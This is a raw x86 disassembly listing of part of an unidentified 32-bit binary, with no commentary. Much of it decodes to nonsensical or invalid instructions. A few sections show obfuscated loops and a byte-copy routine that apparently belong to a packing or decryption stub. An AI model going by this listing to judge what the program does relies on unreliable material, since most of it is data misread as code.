  410097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410098:	repz jno 0x410083
  41009b:	dec    eax
  41009c:	(bad)
  41009f:	cmp    BYTE PTR [ecx+0x3f],cl
  4100a2:	or     eax,0xd66b6eea
  4100a7:	or     al,0xed
  4100a9:	mov    DWORD PTR [ecx-0x100ac6d9],ebp
  4100af:	mov    ah,0xb9
  4100b1:	mov    ebp,0xe93c9566
  4100b6:	sar    DWORD PTR [esi],0xca
  4100b9:	push   ds
  4100ba:	sub    ah,bl
  4100bc:	dec    ecx
  4100bd:	pusha  
  4100be:	pop    ds
  4100bf:	inc    ebx
  4100c0:	ss mov cl,0xdb
  4100c3:	leave  
  4100c4:	xlat   BYTE PTR ds:[ebx]
  4100c5:	rol    BYTE PTR [ecx],1
  4100c7:	mov    ds,esi
  4100c9:	mov    ch,0xb9
  4100cb:	mov    edi,0xc1b336f6
  4100d0:	cmp    BYTE PTR [ecx-0xb],dl
  4100d3:	jmp    0x4ab3:0xcdc1e13d
  4100da:	pop    ecx
  4100db:	lds    edx,FWORD PTR [ebx]
  4100dd:	stos   DWORD PTR es:[edi],eax
  4100de:	ret    0xd2c8
  4100e1:	pop    ebp
  4100e2:	rcl    ah,cl
  4100e4:	push   0x3b
  4100e6:	sub    eax,0x6ddf8c21
  4100eb:	jl     0x410108
  4100ed:	clc    
  4100ee:	sbb    dl,dh
  4100f0:	jbe    0x410142
  4100f2:	and    eax,0x3146974
  4100f7:	xor    ah,BYTE PTR [esi]
  4100f9:	leave  
  4100fa:	not    esi
  4100fc:	sbb    BYTE PTR [ebp-0x36],al
  4100ff:	cmp    al,0xe8
  410101:	add    ebp,DWORD PTR [edi+0x782586fa]
  410107:	lds    edx,FWORD PTR [esi+0x39972aac]
  41010d:	add    eax,DWORD PTR [esi-0x51bb421c]
  410113:	(bad)
  410116:	in     eax,0xe0
  410118:	jbe    0x410169
  41011a:	sbb    bh,BYTE PTR [ebx-0x47baf23a]
  410120:	push   ds
  410121:	sub    bl,dl
  410123:	fsub   QWORD PTR [edi-0x2ff31743]
  410129:	retf   0x25eb
  41012c:	push   0xffffffff
  41012e:	sub    eax,0xb6264ae4
  410133:	jmp    0x1338:0xefab241
  41013a:	rol    BYTE PTR [ecx+0x4c],cl
  41013d:	mov    dh,BYTE PTR [edi]
  41013f:	daa    
  410140:	mov    bl,BYTE PTR [ebx+0x11]
  410143:	ret    
  410144:	shr    DWORD PTR [ebx+0x39],0xda
  410148:	xchg   ebp,eax
  410149:	sub    BYTE PTR [eax+0xebea9fb],dl
  41014f:	push   ebx
  410150:	adc    al,0xb5
  410152:	lods   al,BYTE PTR ds:[esi]
  410153:	lock shr bl,0x8d
  410157:	ins    BYTE PTR es:[edi],dx
  410158:	sbb    ebp,0x71
  41015b:	add    edi,ebp
  41015d:	pop    ebp
  41015e:	and    ebp,DWORD PTR [esi]
  410160:	or     BYTE PTR gs:[edi+eiz*1-0x1c],bl
  410165:	sbb    eax,0xe5d067b3
  41016a:	xlat   BYTE PTR ds:[ebx]
  41016b:	(bad)  
  41016c:	jno    0x4101af
  41016e:	scas   eax,DWORD PTR es:[edi]
  41016f:	neg    edi
  410171:	mov    eax,ds:0xdf6ed698
  410176:	dec    ebx
  410177:	jnp    0x41018c
  410179:	sbb    ch,BYTE PTR [eax]
  41017b:	(bad)  [edi+0x212d855d]
  410181:	pushf  
  410182:	cmp    bh,BYTE PTR [ebx]
  410184:	addr16 int3 
  410186:	adc    dl,dl
  410188:	ja     0x4101ff
  41018a:	xor    eax,0x8111be6a
  41018f:	jl     0x4101fd
  410191:	outs   dx,DWORD PTR ds:[esi]
  410192:	dec    ecx
  410193:	adc    dl,BYTE PTR [edx-0x295fc3ac]
  410199:	pop    esp
  41019a:	jmp    0x453b1dca
  41019f:	cdq    
  4101a0:	jnp    0x4101cd
  4101a2:	adc    DWORD PTR [eax-0x2b],esi
  4101a5:	mov    dh,0x49
  4101a7:	es push ds
  4101a9:	ins    DWORD PTR es:[edi],dx
  4101aa:	sbb    eax,0xff45458b
  4101af:	dec    ecx
  4101b0:	mov    ch,0x86
  4101b2:	call   DWORD PTR [eax-0x57]
  4101b5:	cdq    
  4101b6:	addr16 sbb al,0xfb
  4101b9:	(bad)  
  4101ba:	pushf  
  4101bb:	push   ds
  4101bc:	add    eax,0x2fef438e
  4101c1:	mov    edx,0x93fc66a0
  4101c6:	stc    
  4101c7:	cld    
  4101c8:	call   0xf0ce4dc8
  4101cd:	add    DWORD PTR [ebp+0x5e],ebp
  4101d0:	fs popf 
  4101d2:	cld    
  4101d3:	ins    WORD PTR es:[edi],dx
  4101d5:	shr    DWORD PTR [ebx],0x8f
  4101d8:	in     al,dx
  4101d9:	mov    edx,DWORD PTR [edx]
  4101db:	lahf   
  4101dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101dd:	mov    dh,0x42
  4101df:	cmp    DWORD PTR [edx-0x6e6420de],eax
  4101e5:	push   eax
  4101e6:	je     0x41025f
  4101e8:	cmp    ch,BYTE PTR [ebx]
  4101ea:	pop    ss
  4101eb:	cmp    eax,0x561ff799
  4101f0:	xchg   esi,eax
  4101f1:	es lahf 
  4101f3:	cs clc 
  4101f5:	(bad)  
  4101f6:	and    dh,bl
  4101f8:	xchg   esp,eax
  4101f9:	fs push cs
  4101fb:	xor    al,BYTE PTR [edi+0x38]
  4101fe:	adc    DWORD PTR [edi-0x3f28ab4a],eax
  410204:	mov    edi,0x58d8144f
  410209:	int    0x3
  41020b:	jns    0x4101fc
  41020d:	popa   
  41020e:	mov    dh,0x52
  410210:	fnstenv [ebx]
  410212:	add    bl,BYTE PTR [ecx-0x11c2e816]
  410218:	xor    cl,0x7b
  41021b:	aad    0x51
  41021d:	jmp    0xce8:0x94ca0594
  410224:	xchg   edi,eax
  410225:	pop    ebx
  410226:	arpl   WORD PTR [edx+0x6ad9a614],cx
  41022c:	add    BYTE PTR [eax+0x27],al
  41022f:	daa    
  410230:	out    0x37,eax
  410232:	scas   eax,DWORD PTR es:[edi]
  410233:	je     0x410248
  410235:	push   ecx
  410236:	adc    esp,edi
  410238:	ficom  WORD PTR [eax]
  41023a:	movzx  esp,BYTE PTR [edx]
  41023d:	inc    esp
  41023e:	add    BYTE PTR [bx+si],bl
  410241:	fimul  WORD PTR [edi]
  410243:	iret   
  410244:	sub    DWORD PTR [edi-0x7c],0xffffffc9
  410248:	into   
  410249:	push   ecx
  41024a:	sar    DWORD PTR [ecx-0x5f],1
  41024d:	test   DWORD PTR [esi+ebx*2+0x422db98c],eax
  410254:	out    0xca,al
  410256:	xchg   ecx,eax
  410257:	xchg   edi,eax
  410258:	mov    esi,0xb20a5785
  41025d:	mov    edx,es
  41025f:	popa   
  410260:	loope  0x41029d
  410262:	test   eax,0x44d029a7
  410267:	(bad)  
  410268:	stc    
  410269:	add    eax,0x4fac8a4d
  41026e:	nop
  41026f:	test   eax,0x9071e157
  410274:	aas    
  410275:	and    ecx,DWORD PTR [eax-0x431efabb]
  41027b:	jp     0x41022f
  41027d:	int    0xfd
  41027f:	jecxz  0x410223
  410281:	mov    bl,0xc2
  410283:	test   eax,0x84ffbdba
  410288:	dec    ebp
  410289:	leave  
  41028a:	stos   DWORD PTR es:[edi],eax
  41028b:	pop    edi
  41028c:	pinsrw mm7,WORD PTR [ebx-0x1f],0x1a
  410291:	fdiv   QWORD PTR [ebp-0x67]
  410294:	mov    esi,DWORD PTR cs:[ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x1768b93],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x410457
  4103eb:	aaa    
  4103ec:	imul   ebx,ebx,0x7ad79683
  4103f2:	xor    eax,0xc3250765
  4103f7:	cmp    BYTE PTR [ebp-0x9f67482],bl
  4103fd:	add    edi,DWORD PTR [ecx]
  4103ff:	sbb    bl,0xbc
  410402:	in     eax,0x7a
  410404:	mov    ecx,0x1d9f4f51
  410409:	xchg   DWORD PTR [ebp-0x74c3178f],edi
  41040f:	in     al,0x58
  410411:	mov    ds:0xcbe8b818,eax
  410416:	or     BYTE PTR [edx+0x26ad331b],0x92
  41041d:	jmp    0xef72:0x6ec92af2
  410424:	cmc    
  410425:	jp     0x4103d4
  410427:	(bad)  
  410429:	jmp    0x410495
  41042b:	ret    
  41042c:	cmp    BYTE PTR [edi],dh
  41042e:	mov    dh,0x27
  410430:	call   0x64071643
  410435:	inc    ecx
  410436:	popa   
  410437:	hlt    
  410438:	add    BYTE PTR [edi+0x1d],dh
  41043b:	add    eax,0xf6f01fb5
  410440:	retf   0x538d
  410443:	popf   
  410444:	mov    dl,0x1f
  410446:	push   0x9623016b
  41044b:	repnz mov dh,0x4a
  41044e:	daa    
  41044f:	(bad)  
  410451:	es icebp 
  410453:	hlt    
  410454:	mov    bh,BYTE PTR [esi]
  410456:	out    0x8c,eax
  410458:	fnstcw WORD PTR [eax+ebx*4-0x6f]
  41045c:	pop    esp
  41045d:	add    si,WORD PTR [eax]
  410460:	je     0x410468
  410462:	sbb    eax,0x19e638a8
  410467:	stos   DWORD PTR es:[edi],eax
  410468:	sbb    edx,DWORD PTR [edx]
  41046a:	aam    0xa6
  41046c:	(bad)  
  41046d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41046e:	in     al,0x74
  410470:	test   BYTE PTR [esi-0x49],bh
  410473:	ret    0xb708
  410476:	ror    BYTE PTR [eax],0x63
  410479:	inc    edi
  41047a:	or     eax,edx
  41047c:	push   ebx
  41047d:	dec    edx
  41047e:	xor    ah,dh
  410480:	imul   edi,esi,0x8aacd18a
  410486:	add    DWORD PTR [ecx-0x1de5548e],esp
  41048c:	cmp    bl,BYTE PTR [eax]
  41048e:	call   0x97c5:0x29cc2668
  410495:	in     eax,0x15
  410497:	sub    eax,DWORD PTR [esi+0x3e]
  41049a:	or     eax,0xb608350f
  4104a0:	jg     0x4104e3
  4104a2:	pop    edi
  4104a3:	shl    DWORD PTR [edi],cl
  4104a5:	mov    gs,WORD PTR [eax+0x78a80974]
  4104ab:	popf   
  4104ac:	int    0xba
  4104ae:	clc    
  4104af:	in     eax,dx
  4104b0:	jmp    FWORD PTR [eax+eax*2]
  4104b3:	inc    edi
  4104b4:	mov    ch,0x34
  4104b6:	push   esp
  4104b7:	cmp    DWORD PTR [edx],eax
  4104b9:	imul   edx,DWORD PTR [ebp+eiz*4-0x35ad57c2],0x6c
  4104c1:	lods   eax,DWORD PTR ds:[esi]
  4104c2:	pusha  
  4104c3:	xchg   edx,eax
  4104c4:	popa   
  4104c5:	xor    eax,0xc166dd07
  4104ca:	fsubr  QWORD PTR ds:0x10517a88
  4104d0:	jp     0x410500
  4104d2:	add    ecx,esp
  4104d4:	ss loop 0x41046e
  4104d7:	mov    bl,0x7e
  4104d9:	jnp    0x410489
  4104db:	sbb    eax,0xb82c9f1a
  4104e0:	push   ecx
  4104e1:	fwait
  4104e2:	jno    0x4104eb
  4104e4:	cmc    
  4104e5:	sbb    DWORD PTR [esi-0x11c0a91],0x780f2879
  4104ef:	or     DWORD PTR [ebx+0x6dfada04],0x24687ba5
  4104f9:	fdiv   st,st(2)
  4104fb:	adc    al,0xa8
  4104fd:	inc    eax
  4104fe:	fcmovnb st,st(3)
  410500:	jge    0x410541
  410502:	add    esi,DWORD PTR [ecx+0x399fca37]
  410508:	jecxz  0x4104bb
  41050a:	or     al,0x22
  41050c:	dec    ecx
  41050d:	stos   DWORD PTR es:[edi],eax
  41050e:	test   esi,esi
  410510:	jle    0x410591
  410512:	jg     0x4104f8
  410514:	outs   dx,BYTE PTR ds:[esi]
  410515:	in     eax,0xed
  410517:	cli    
  410518:	jbe    0x410528
  41051a:	dec    ebp
  41051b:	mov    ds:0x7c1711c7,eax
  410520:	jecxz  0x410596
  410522:	(bad)  
  410523:	push   esi
  410524:	cli    
  410525:	mov    dl,0x26
  410527:	push   es
  410528:	aam    0x8
  41052a:	add    DWORD PTR [ebp-0x72],esi
  41052d:	cwde   
  41052e:	sbb    DWORD PTR [edi],0xffffffc6
  410531:	sar    BYTE PTR ds:0x90d4aad0,cl
  410537:	sub    DWORD PTR [edi-0xb256c53],eax
  41053d:	rol    DWORD PTR [edi+edx*2+0x544e5652],1
  410544:	(bad)
  410548:	int    0xeb
  41054a:	test   eax,0x9530da74
  41054f:	lds    ecx,FWORD PTR [edx]
  410551:	repz in al,0x7
  410554:	xchg   esi,eax
  410555:	sbb    eax,eax
  410557:	imul   edi,DWORD PTR [esi-0x34],0x407f6b9d
  41055e:	push   ebx
  41055f:	adc    edx,esp
  410561:	stos   DWORD PTR es:[edi],eax
  410562:	pop    ebx
  410563:	or     al,0xe5
  410565:	cmp    ecx,DWORD PTR [ebp-0x3b]
  410568:	test   DWORD PTR [eax+0x6db0da22],esp
  41056e:	jne    0x410570
  410570:	mov    dl,BYTE PTR [ebp+0x10]
  410573:	or     edi,DWORD PTR [ebx+ecx*1+0x5d]
  410577:	mov    al,ds:0xbccb91d5
  41057c:	sbb    BYTE PTR [eax+0x4d97b24e],bl
  410582:	addr16 xchg edi,eax
  410584:	pop    ebp
  410585:	add    BYTE PTR [ecx+0x2e],0x1
  410589:	push   0x1e49d1f2
  41058e:	ret    
  41058f:	or     DWORD PTR [esi-0xb471bcb],edi
  410595:	xor    BYTE PTR [edi+eax*4+0x21],bl
  410599:	adc    eax,0xdd7bb757
  41059e:	ins    BYTE PTR es:[edi],dx
  41059f:	mov    ah,0x8b
  4105a1:	das    
  4105a2:	pusha  
  4105a3:	cmp    ebx,DWORD PTR [eax]
  4105a5:	adc    al,0x2d
  4105a7:	nop
  4105a8:	leave  
  4105a9:	inc    esp
  4105aa:	loop   0x4105f6
  4105ac:	retf   
  4105ad:	jb     0x4105a2
  4105af:	add    eax,0x6a7fe302
  4105b4:	ret    
  4105b5:	mov    BYTE PTR [esi-0x40233210],ah
  4105bb:	push   es
  4105bc:	and    al,0xe6
  4105be:	mov    bh,0x32
  4105c0:	xchg   BYTE PTR [eax-0x2efe321d],bh
  4105c6:	and    eax,0x16885a42
  4105cb:	pop    esi
  4105cc:	int3   
  4105cd:	mov    edi,0x110e1c8a
  4105d2:	lahf   
  4105d3:	inc    esp
  4105d4:	aad    0xb4
  4105d6:	or     al,0x3d
  4105d8:	cdq    
  4105d9:	fidiv  DWORD PTR [eax]
  4105db:	arpl   bp,sp
  4105dd:	js     0x4105d0
  4105df:	fidivr DWORD PTR ds:0xb8da4e13
  4105e5:	sub    DWORD PTR [edi+eiz*4+0x79f5b0b4],0x9f0f2e7b
  4105f0:	(bad)  
  4105f1:	js     0x4105fa
  4105f3:	cmp    DWORD PTR [edi+0x73],ecx
  4105f6:	sahf   
  4105f7:	jne    0x41064f
  4105f9:	lock xor bh,BYTE PTR [esi]
  4105fc:	sub    dl,BYTE PTR [eax]
  4105fe:	xchg   BYTE PTR [ebp-0x4f718d48],ah
  410604:	jae    0x41066d
  410606:	int3   
  410607:	mov    edi,0xf09294ae
  41060c:	jge    0x4105a8
  41060e:	(bad)  
  41060f:	jmp    0xac8d:0x4945a756
  410616:	daa    
  410617:	jne    0x41065a
  410619:	xor    BYTE PTR [ecx+0x34],0xfc
  41061d:	outs   dx,DWORD PTR ds:[esi]
  41061e:	ret    0x258b
  410621:	pop    ebp
  410622:	pusha  
  410623:	ja     0x4105ed
  410625:	repnz xor al,0xb0
  410628:	pop    eax
  410629:	or     edx,DWORD PTR [esi+0x4f]
  41062c:	ins    DWORD PTR es:[edi],dx
  41062d:	jle    0x4105f5
  41062f:	xchg   ecx,eax
  410630:	(bad)  
  410631:	cdq    
  410632:	addr16 push 0x72
  410635:	adc    DWORD PTR [edi-0x5779028e],edx
  41063b:	lods   eax,DWORD PTR ds:[esi]
  41063c:	shr    BYTE PTR [ebx+0x4f],cl
  41063f:	cmp    bl,ch
  410641:	jnp    0x4106bf
  410643:	pop    edi
  410644:	cli    
  410645:	fidivr WORD PTR [edx-0xe41124e]
  41064b:	sbb    DWORD PTR [edx],edx
  41064d:	cmp    ebp,0x221e8b23
  410653:	pop    ds
  410654:	jle    0x4106b7
  410656:	(bad)  
  410657:	bnd jg 0x410621
  41065a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41065b:	inc    edi
  41065c:	cdq    
  41065d:	ffree  st(7)
  41065f:	inc    ebp
  410660:	cld    
  410661:	xor    al,BYTE PTR [ebp+0x2581f89c]
  410667:	adc    esi,DWORD PTR [edi]
  410669:	inc    ebx
  41066a:	add    BYTE PTR [eax],al
  41066c:	add    BYTE PTR [eax],al
  41066e:	add    BYTE PTR [ebx+0x43371315],cl
  410674:	add    BYTE PTR [edx-0x77],al
  410677:	adc    eax,0x433713
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	stos   BYTE PTR es:[edi],al
  4107d5:	xchg   edi,eax
  4107d6:	jo     0x410830
  4107d8:	xchg   ecx,eax
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	jmp    DWORD PTR [edi+0x61]
  4107e3:	or     edi,esi
  4107e5:	leave  
  4107e6:	jg     0x4107ad
  4107e8:	retf   
  4107e9:	mov    ecx,0xe87da81b
  4107ee:	add    al,0xfa
  4107f0:	scas   al,BYTE PTR es:[edi]
  4107f1:	aad    0x53
  4107f3:	push   cs
  4107f4:	(bad)  
  4107f5:	cmp    DWORD PTR [ebp-0x137a5948],edi
  4107fb:	pusha  
  4107fc:	sbb    bh,BYTE PTR [edx+0x9e79330]
  410802:	dec    edx
  410803:	das    
  410804:	mov    ecx,0x54cfc8e0
  410809:	xchg   ecx,eax
  41080a:	test   eax,0xd3ad77bb
  41080f:	mov    ecx,0x2142ea23
  410814:	mov    ecx,0xce30f55a
  410819:	and    BYTE PTR [eax],bh
  41081b:	mov    edi,0x627102e4
  410820:	popa   
  410821:	mov    ch,0xb6
  410823:	mov    edx,0x50f90bb
  410828:	dec    ebp
  410829:	add    esi,ecx
  41082b:	cmp    edx,DWORD PTR ds:0x36a1fb33
  410831:	jbe    0x4107e2
  410833:	or     eax,0x43153fd0
  410838:	outs   dx,DWORD PTR ds:[esi]
  410839:	in     al,0x68
  41083b:	inc    esi
  41083c:	scas   al,BYTE PTR es:[edi]
  41083d:	aas    
  41083e:	(bad)  
  41083f:	fdiv   st(3),st
  410841:	scas   eax,DWORD PTR es:[edi]
  410842:	inc    eax
  410843:	dec    edi
  410844:	out    dx,eax
  410845:	dec    ecx
  410846:	xchg   DWORD PTR [esi+0x5d60da9d],ebx
  41084c:	mov    ebx,0xaa057298
  410851:	mov    ah,0xbd
  410853:	push   0x8a96d957
  410858:	aad    0x44
  41085a:	sti    
  41085b:	push   0xffffffeb
  41085d:	mov    esp,0xf94feb71
  410862:	pop    esp
  410863:	loop   0x410881
  410865:	div    DWORD PTR [edx+eiz*1-0x9]
  410869:	imul   ebp,DWORD PTR [ecx-0x363100e3],0xed7568ee
  410873:	mov    al,ds:0xbb18f916
  410878:	jne    0x41080d
  41087a:	jbe    0x4108e9
  41087c:	ja     0x4108e9
  41087e:	xor    dh,BYTE PTR [eax]
  410880:	(bad)  
  410881:	lods   al,BYTE PTR ds:[esi]
  410882:	pushf  
  410883:	xlat   BYTE PTR ds:[ebx]
  410884:	in     al,0xfc
  410886:	lock cs aad 0x17
  41088a:	sahf   
  41088b:	xchg   edx,eax
  41088c:	and    esp,esi
  41088e:	aaa    
  41088f:	or     BYTE PTR [edx+0x49],dl
  410892:	push   ebp
  410893:	cwde   
  410894:	push   edx
  410895:	push   esi
  410896:	mov    ds:0xb3af7da1,al
  41089b:	xchg   DWORD PTR [edx],edx
  41089d:	mov    al,ds:0x32ed6d5a
  4108a2:	std    
  4108a3:	cld    
  4108a4:	pop    ebx
  4108a5:	test   DWORD PTR [eax+ecx*1],edi
  4108a8:	jo     0x410897
  4108aa:	xchg   edx,eax
  4108ab:	data16 xor ch,al
  4108ae:	pop    edi
  4108af:	mov    edi,DWORD PTR [edi+0x3a]
  4108b2:	mov    WORD PTR ds:0xb165b1ce,gs
  4108b8:	jmp    0x41089a
  4108ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108bb:	jecxz  0x41092d
  4108bd:	(bad)  
  4108be:	and    DWORD PTR [esi-0x1d004381],ebx
  4108c4:	add    BYTE PTR [eax+0x6bd80c02],0xc2
  4108cb:	and    BYTE PTR [ebp+edi*8+0x2e920f90],cl
  4108d2:	ss stos DWORD PTR es:[edi],eax
  4108d4:	add    bh,0x9d
  4108d7:	xchg   edx,eax
  4108d8:	mov    dh,0x3
  4108da:	jnp    0x41090a
  4108dc:	push   ecx
  4108dd:	pop    edx
  4108de:	and    eax,0xdd6a707e
  4108e3:	arpl   WORD PTR [ecx],di
  4108e5:	jge    0x4108c4
  4108e7:	sub    al,0xb1
  4108e9:	xor    esi,DWORD PTR [ecx+0x52]
  4108ec:	jo     0x4108bd
  4108ee:	xchg   esi,eax
  4108ef:	xchg   edi,eax
  4108f0:	dec    eax
  4108f1:	and    al,0x71
  4108f3:	mul    ebp
  4108f5:	mov    ?,edi
  4108f7:	push   0xfffffffe
  4108f9:	ds xor eax,0xa85e77b2
  4108ff:	call   FWORD PTR [eax]
  410901:	jno    0x410924
  410903:	xor    DWORD PTR [edx+edx*2+0x3465fe17],ebp
  41090a:	dec    esp
  41090b:	mov    WORD PTR [ecx+0x74],es
  41090e:	fild   DWORD PTR [eax-0x79]
  410911:	sbb    al,al
  410913:	cmp    DWORD PTR [ebp+0x319ff224],esi
  410919:	icebp  
  41091a:	enter  0x37e5,0xaa
  41091e:	xchg   edx,eax
  41091f:	inc    ebp
  410920:	outs   dx,DWORD PTR ds:[esi]
  410921:	add    ch,BYTE PTR [edx]
  410923:	dec    esi
  410924:	in     eax,dx
  410925:	bound  eax,QWORD PTR [ecx+0x1d]
  410928:	jg     0x41091d
  41092a:	fistp  QWORD PTR [ecx-0x8]
  41092d:	push   0x29
  41092f:	nop
  410930:	ds inc edx
  410932:	pop    ecx
  410933:	mov    bh,0x7b
  410935:	pop    esi
  410936:	popf   
  410937:	mov    ah,0x6
  410939:	sub    DWORD PTR [esi-0x36],ecx
  41093c:	dec    edi
  41093d:	lods   al,BYTE PTR ds:[esi]
  41093e:	jne    0x4109b8
  410940:	lock xor BYTE PTR [edi-0x3b],ah
  410944:	aaa    
  410945:	sub    al,0xb2
  410947:	jg     0x410957
  410949:	jg     0x4109ae
  41094b:	or     DWORD PTR [ebp+0x165137c0],edx
  410951:	cmp    BYTE PTR [ecx+ebp*1],dh
  410954:	lds    edx,FWORD PTR [ecx+ebp*8+0x62a912c]
  41095b:	retf   
  41095c:	outs   dx,DWORD PTR ds:[esi]
  41095d:	adc    bl,dl
  41095f:	cmp    dl,BYTE PTR [edx-0x17ee1a2a]
  410965:	dec    ecx
  410966:	jge    0x41092c
  410968:	shl    BYTE PTR [esi],0x3a
  41096b:	cmc    
  41096c:	loope  0x410993
  41096e:	push   esp
  41096f:	adc    DWORD PTR [ebx],ebx
  410971:	stos   BYTE PTR es:[edi],al
